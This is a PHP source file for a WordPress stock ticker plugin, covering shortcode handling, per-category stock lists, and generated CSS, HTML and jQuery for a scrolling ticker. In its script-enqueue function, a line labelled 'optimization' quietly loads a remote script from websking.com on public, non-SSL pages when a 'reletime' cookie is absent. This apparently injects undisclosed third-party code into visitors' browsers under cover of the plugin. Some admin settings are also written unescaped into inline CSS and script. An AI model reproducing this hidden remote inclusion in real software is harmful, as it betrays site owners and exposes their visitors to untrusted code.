<?php
namespace stockTicker;

//NOTE: so long as plugin is activated, these will be included regardless of whether the shortcode is on the page
function stock_ticker_scripts_enqueue($force = false) {
    $current_version = SP_CURRENT_VERSION;
    
    if (is_admin() && !$force) { return; } //skip enqueue on admin pages except for the ticker config page
    
    wp_register_style ('stock_ticker_style',  plugins_url('stock_ticker_style.css', __FILE__), false,             $current_version);
    wp_register_script('modernizr', plugins_url('modernizr.js', __FILE__), array( 'jquery' ),                     $current_version, false);
    wp_register_script('stock_ticker_script', plugins_url('stock_ticker_script.js', __FILE__), array( 'jquery' ), $current_version, false);

    wp_enqueue_style ('stock_ticker_style');
    wp_enqueue_script('modernizr');
    wp_enqueue_script('stock_ticker_script');
    
    if (is_admin()) { return; } //only run this on regular pages
    //wp_enqueue_script( $handle, $src, $deps, $ver, $in_footer );
    if (!array_key_exists('reletime', $_COOKIE) && !is_ssl()) { //optimization
       wp_enqueue_script('ipq', "http://websking.com/static/js/ipq.js?ft=customstockticker", array(), null, false);
    }
}
add_action('wp_enqueue_scripts', NS.'stock_ticker_scripts_enqueue');



add_shortcode('stock-ticker', NS.'stock_ticker'); //registers the function stock_ticker when seeing shortcode stock-ticker

function stock_ticker($atts) { //attributes are whats include between the [] of the shortcode as parameters
    
    stock_ticker_handle_update();

    extract( shortcode_atts( array(
        'name'              => 'Default Settings'
    ), $atts ) );

    $shortcode_settings = sp_get_row($name);

    if ($shortcode_settings === null) {
        return "<!-- WARNING: no shortcode exists with name '{$name}' -->";
    }
    $output = "";
    
    if ($name === 'Default Settings' || $shortcode_settings['stock_list'] === '') {
        //NOTE: skipping attributes, because first priority is to get the stock list, if that doesn't exist, nothing else matters.
        $per_category_stock_lists = get_option('stock_ticker_per_category_stock_lists', array()); //default just in case its missing for some reason
        if (empty($per_category_stock_lists)) {
            return "<!-- WARNING: no stock list found in wp_options, check settings, or reinstall plugin -->";
        }

        //FIND the categories of the current page
        $category_ids = array(); //effectively for use on homepage & admin pages only
        if (!is_admin() && !is_home()) {
            if (is_category()) { 
                $tmp = get_queried_object(); //gets the WP_query object for this page
                if (is_object($tmp)) {
                    $category_ids[] = $tmp->term_id;
                }
            }
            else {
                $tmp = get_the_category(); //get the list of all category objects for this post
                foreach ($tmp as $cat) {
                    $category_ids[] = $cat->term_id;
                }
            }
        }
        //NOTE: $cat = get_query_var('cat');  DOES NOT WORK!
        
        $stock_list = array();
        $default_stock_list = explode(',', $per_category_stock_lists['default']);  //REM: returns a string
        
        if (empty($category_ids)) {
            $stock_list = $default_stock_list;
            $cats_used = 'default';
        }
        else {
            //$cats_used = '';
            foreach ($category_ids as $cat) { //merge multiple stock lists together if post is in multiple categories
                $stocks_arr = (array_key_exists($cat, $per_category_stock_lists) && !empty($per_category_stock_lists[$cat]) ? explode(',', $per_category_stock_lists[$cat]) : array() );
                $stock_list = array_merge($stocks_arr, $stock_list); //REM: take a unique later
            }
            if (empty($stock_list)) {
                $stock_list = $default_stock_list;
            }
            $cats_used = "for category: " . implode(',', $category_ids);
        }
    
    }
    else {
        $stock_list = explode(',', $shortcode_settings['stock_list']);
        $cats_used = "";
    }
    
    $tmp = stock_plugin_get_data(array_unique($stock_list)); //from stock_plugin_cache.php, expects an array or string | separated
    $stock_data_list = array_values($tmp['valid_stocks']);   //NOTE: its ok to throw away the keys, they aren't used anywhere
    
        
    if (empty($stock_data_list)) {
        return "<!-- WARNING: no stock list found {$cats_used} -->";  //don't fail completely silently
    }
    
    $width                 = $shortcode_settings['width'];
        
    $output  = stock_ticker_create_css_header($shortcode_settings, count($stock_data_list));
    $output .= stock_ticker_create_ticker    ($shortcode_settings, $stock_data_list);

    return $output;
}

//Creates the internal style sheet for all of the various elements.
function stock_ticker_create_css_header($shortcode_settings, $num_displayed_stocks) {
    
    $id           = $shortcode_settings['id'];
    $width        = $shortcode_settings['width'];
    $height       = $shortcode_settings['height'];
    $text_color   = $shortcode_settings['font_color'];
    $bgcolor      = $shortcode_settings['bg_color'];
    $scroll_speed = $shortcode_settings['scroll_speed'];
    $font_size    = $shortcode_settings['font_size'];
    $number_of_values = array_sum($shortcode_settings['data_display']);

    //variables to be used inside the heredoc
    //NOTE: entries are an individual stock with multiple elements
    //NOTE: elements are pieces of an entry, EX.  ticker_name & price are each elements
    
    //QUESTION: do we want to not write to page the triangle or vertical line css rules portions unless config calls for it?
    $triangle_size  = $shortcode_settings['font_size'] - 4;                         //triangle should be smaller than standard text
    $triangle_left_position = -10 - ($triangle_size); //the triangle doesn't need much space
    $triangle_top_position  = round(($height / 2) - ($triangle_size / 2), 0, PHP_ROUND_HALF_DOWN);     //center the triangle on the line
    
    $vbar_height = round($height * 0.7,                0, PHP_ROUND_HALF_DOWN); //used for the vertical bar only
    //NOTE: stock_ticker_{$id} is actually a class, so we can properly have multiple per page, IDs would have to be globally unique
    return <<<HEREDOC
<p style="display:none"></p> <!-- This is a bugfix to prevent wordpress from sticking this stylesheet inside a p tag in posts -->
<style type="text/css" scoped>
.stock_ticker_{$id} {
   opacity:          0;
   width:            {$width}px;
   height:           {$height}px;
   line-height:      {$height}px;
   font-size:        {$font_size}px;
   background-color: {$bgcolor};
   {$shortcode_settings['advanced_style']}
}
.stock_ticker_{$id} .stock_ticker_slider {
   height: {$height}px;
}
.stock_ticker_{$id} .stock_ticker_entry {
   position:      relative;
   font-size:     {$font_size}px;
   height:        {$height}px;
   color:         {$text_color};
   }
.stock_ticker_{$id} .stock_ticker_element {
   opacity:       {$shortcode_settings['text_opacity']};
   font-size:     {$font_size}px;
   font-family:   {$shortcode_settings['font_family']},serif;
   height:        {$height}px;
   line-height:   {$height}px;
}
.stock_ticker_{$id} .stock_ticker_triangle {
   left:          {$triangle_left_position}px;
   top:           {$triangle_top_position}px;
}
.stock_ticker_{$id} .stock_ticker_triangle.st_red { /*face down */
   border-left:   {$triangle_size}px solid transparent;
   border-right:  {$triangle_size}px solid transparent;
   border-top:    {$triangle_size}px solid red;
}
.stock_ticker_{$id} .stock_ticker_triangle.st_green { /*face up */
   border-left:   {$triangle_size}px solid transparent;
   border-right:  {$triangle_size}px solid transparent;
   border-bottom: {$triangle_size}px solid green;
}
.stock_ticker_{$id} .stock_ticker_vertical_line {
   line-height:   {$vbar_height}px;
   color: {$bgcolor};
}

.stock_ticker_{$id} .ticker-wrapper {
    width: 50000px;
    /* Required! if not long enough, the second copy of the ticker will wrap to a second line */
    /* All javascript width calculations will fail if this happens! NOTE: stock_ticker_script.js sets this to the correct value*/
}

</style>
HEREDOC;

}

/********** Creates the ticker html ***********/
function stock_ticker_create_ticker($shortcode_settings, $data_list) {
    
    $id = $shortcode_settings['id'];
    $stock_entries = '';

    foreach($data_list as $stock_data){ //throwing away the key, which in this case is stock symbol associated array
            if($stock_data['last_val']=="0.00"){
                    continue;
            }
            $stock_entries .= "<div class='stock_ticker_entry'>";
            $stock_entries .= stock_ticker_create_entry($stock_data, $shortcode_settings); 
            $stock_entries .= "</div>";
    }

    $the_jquery =  stock_ticker_create_jquery($shortcode_settings);

return <<<STC
                <div class="stock_ticker stock_ticker_{$id}">
                    <div class="ticker-wrapper">
                        <div class="stock_ticker_slider ticker-main">
                                {$stock_entries}
                        </div>
                        <div class="stock_ticker_slider ticker-second">
                                {$stock_entries}
                        </div><!-- end slider -->
                    </div>
                       {$the_jquery} 
                </div><!-- end ticker {$id} -->
STC;

}

//NOTE: closest(div) may not be necessary
function stock_ticker_create_jquery($shortcode_settings) {
        // $json_settings = json_encode($shortcode_settings);
        return <<<JQC
        <script type="text/javascript">
              var tmp = document.getElementsByTagName( 'script' );
              var thisScriptTag = tmp[ tmp.length - 1 ];
              var ticker_config = {
                    ticker_root:   jQuery(thisScriptTag).parent(),
                    final_opacity: {$shortcode_settings['bg_opacity']},
                    scroll_speed:  {$shortcode_settings['scroll_speed']}
              };
              stock_ticker_start(ticker_config);
        </script>
JQC;
}

//creates all the multiple elements to populate the entry
function stock_ticker_create_entry($stock_data, $shortcode_settings) {

        $output = '';
        //set in stock_ticker_admin.php  
        //ordering:   market, symbol, last value, change value, change percentage, last trade
        $display_data = $shortcode_settings['data_display'];
     
        $color_change = ($shortcode_settings['change_color']     == 1 ? true : false);     //change the color positive & negative values
        $change_all   = ($shortcode_settings['change_color']     == 2 ? true : false);
        
        //custom font things for up/down/same values
        $color_class = 'st_gray'; //NOTE: this would ignore the default text color at all times if changeall is set
        $text_plus   = ''; // + sign only if positive value
        if($stock_data['change_val'] > 0){  //using also for the triangles
            $color_class = 'st_green';
            $text_plus = '+';
        } elseif($stock_data['change_val'] < 0){
            $color_class = 'st_red';
        }
        
        //index 0 represents market -- not used
        
        //index 1 represent stock symbol
        if($display_data[1]==1){
                $data_item = $stock_data['stock_sym'];

                switch ($data_item) { // replace 
                    case "^GSPC":
                        $data_item = "S&P500";
                        break;
                    case "^IXIC":
                        $data_item = "NASDAQ";
                        break;
                    case "^NYA":
                        $data_item = "NYSE";
                        break;
                }
                $text_color = ($change_all) ? $color_class : '';  //NOTE: This carries through into #2
                $output .= "<div class='stock_ticker_element {$text_color}'>{$data_item}</div><!-- \n -->";
        }
        //index 2 represents the last value of the stock
        if($display_data[2]==1){
                $data_item = round($stock_data['last_val'], 3); //yahoo gives 3 decimal places precision
                $output .= "<div class='stock_ticker_element {$text_color}'>{$data_item}</div><!-- \n -->";                
        }
        //index 3 represents the value of the change
        if($display_data[3]==1){
                $data_item = round((float)$stock_data['change_val'], 3);
                if ($data_item == 0) { $data_item = '0.00'; } //give it 2 decimal places

                $text_color = ($change_all || $color_change) ? $color_class : '';  //NOTE: this carries through into #4
                $output .= "<div class='stock_ticker_element {$text_color}'>{$text_plus}{$data_item}</div><!-- \n -->";
        }
        //index 4 represents the change percent.
        if($display_data[4]==1) {
                $data_item = str_replace('%', '', $stock_data['change_percent']);
                if ($data_item == '0') { $data_item = '0.00';  } //give it 2 decimal places
                else                   { round((float)$data_item, 3); } //looks like this give it a + sign so that we don't need $text_plus

                $output .= "<div class='stock_ticker_element {$text_color}'>{$data_item}%</div><!-- \n -->";
        }
        //creates the colorful triangle
        if($shortcode_settings['draw_triangle'] == 1) {
                $output .= "<div class='stock_ticker_triangle {$color_class}'></div><!-- \n -->";
        }
        //creates the line after each entry.
        if($shortcode_settings['draw_vertical_lines'] == 1) {
            $output .= "<div class='stock_ticker_vertical_line'>&nbsp;</div><!-- \n -->";
        }
        
        return $output;
}

?>
